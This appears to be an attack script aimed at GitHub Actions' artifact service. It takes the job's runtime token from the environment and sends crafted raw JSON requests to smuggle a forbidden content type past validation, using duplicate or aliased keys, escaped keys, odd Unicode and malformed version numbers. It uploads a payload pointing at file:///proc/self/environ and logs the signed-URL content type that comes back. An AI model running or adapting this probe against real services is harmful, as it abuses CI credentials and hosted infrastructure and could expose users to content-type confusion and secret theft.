'use strict';

const crypto = require('node:crypto');

const SERVICE = '/twirp/github.actions.results.api.v1.ArtifactService/';
const evil = '\u0085application/json';
const safe = 'application/json';

function context() {
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const base = new URL(process.env.ACTIONS_RESULTS_URL).origin;
  const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64url'));
  const scope = payload.scp.split(' ').find((value) => value.startsWith('Actions.Results:'));
  const [, runId, jobId] = scope.split(':');
  return { token, base, runId, jobId };
}

async function rawRpc(ctx, method, body) {
  const response = await fetch(ctx.base + SERVICE + method, {
    method: 'POST',
    headers: { Authorization: `Bearer ${ctx.token}`, 'Content-Type': 'application/json' },
    body,
  });
  return { status: response.status, body: await response.json().catch(() => ({})) };
}

async function rpc(ctx, method, fields) {
  return rawRpc(ctx, method, JSON.stringify({
    workflow_run_backend_id: ctx.runId,
    workflow_job_run_backend_id: ctx.jobId,
    ...fields,
  }));
}

function request(ctx, name, fields) {
  return `{${JSON.stringify('workflow_run_backend_id')}:${JSON.stringify(ctx.runId)},` +
    `${JSON.stringify('workflow_job_run_backend_id')}:${JSON.stringify(ctx.jobId)},` +
    `${JSON.stringify('name')}:${JSON.stringify(name)},${fields}}`;
}

const cases = [
  ['dup-safe-evil', `"version":7,"mime_type":${JSON.stringify(safe)},"mime_type":${JSON.stringify(evil)}`],
  ['dup-evil-safe', `"version":7,"mime_type":${JSON.stringify(evil)},"mime_type":${JSON.stringify(safe)}`],
  ['alias-safe-evil', `"version":7,"mime_type":${JSON.stringify(safe)},"mimeType":${JSON.stringify(evil)}`],
  ['alias-evil-safe', `"version":7,"mime_type":${JSON.stringify(evil)},"mimeType":${JSON.stringify(safe)}`],
  ['escaped-key', `"version":7,"mime_type":${JSON.stringify(safe)},"mime\\u005ftype":${JSON.stringify(evil)}`],
  ['v-neg1', `"version":-1,"mime_type":${JSON.stringify(evil)}`],
  ['v-neg249', `"version":-249,"mime_type":${JSON.stringify(evil)}`],
  ['v-intmin-plus7', `"version":-2147483641,"mime_type":${JSON.stringify(evil)}`],
  ['v-intmin', `"version":-2147483648,"mime_type":${JSON.stringify(evil)}`],
  ['v-intmax', `"version":2147483647,"mime_type":${JSON.stringify(evil)}`],
  ['v-overflow7', `"version":4294967303,"mime_type":${JSON.stringify(evil)}`],
  ['v-string-neg249', `"version":"-249","mime_type":${JSON.stringify(evil)}`],
  ['v-fraction', `"version":6.999999999999999,"mime_type":${JSON.stringify(evil)}`],
  ['v-exp7', `"version":7e0,"mime_type":${JSON.stringify(evil)}`],
  ['dup-v7-v6', `"version":7,"version":6,"mime_type":${JSON.stringify(evil)}`],
  ['dup-v6-v7', `"version":6,"version":7,"mime_type":${JSON.stringify(evil)}`],
  ['dup-v6-v7-safe-evil', `"version":6,"mime_type":${JSON.stringify(safe)},"version":7,"mime_type":${JSON.stringify(evil)}`],
  ['nul-suffix', `"version":7,"mime_type":"application/json\\u0000"`],
  ['lone-surrogate-prefix', `"version":7,"mime_type":"\\ud885application/json"`],
];

(async () => {
  const ctx = context();
  const payload = Buffer.from('{"full_name":"deser/probe","owner":{"login":"p","avatar_url":"file:///proc/self/environ"}}');
  for (let index = 0; index < cases.length; index += 1) {
    const [label, fields] = cases[index];
    const name = `deser-${index}-${Date.now()}.json`;
    const created = await rawRpc(ctx, 'CreateArtifact', request(ctx, name, fields));
    const uploadUrl = created.body.signed_upload_url || created.body.signedUploadUrl;
    if (!uploadUrl) {
      console.log('CASE ' + JSON.stringify({ label, create: created.status,
        message: created.body.msg || created.body.message || created.body.code || '' }));
      continue;
    }
    const uploaded = await fetch(uploadUrl, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/octet-stream', 'x-ms-blob-type': 'BlockBlob' },
      body: payload,
    });
    const finalized = await rpc(ctx, 'FinalizeArtifact', {
      name,
      size: String(payload.length),
      hash: `sha256:${crypto.createHash('sha256').update(payload).digest('hex')}`,
    });
    const artifactId = finalized.body.artifact_id || finalized.body.artifactId || null;
    const signed = await rpc(ctx, 'GetSignedArtifactURL', { name });
    const downloadUrl = signed.body.signed_url || signed.body.signedUrl;
    let rsct = null;
    if (downloadUrl) rsct = new URL(downloadUrl).searchParams.get('rsct');
    console.log('CASE ' + JSON.stringify({ label, create: created.status, upload: uploaded.status,
      finalize: finalized.status, artifactId, signed: signed.status, rsct }));
  }
})().catch((error) => {
  console.error(error && error.stack || error);
  process.exitCode = 1;
});
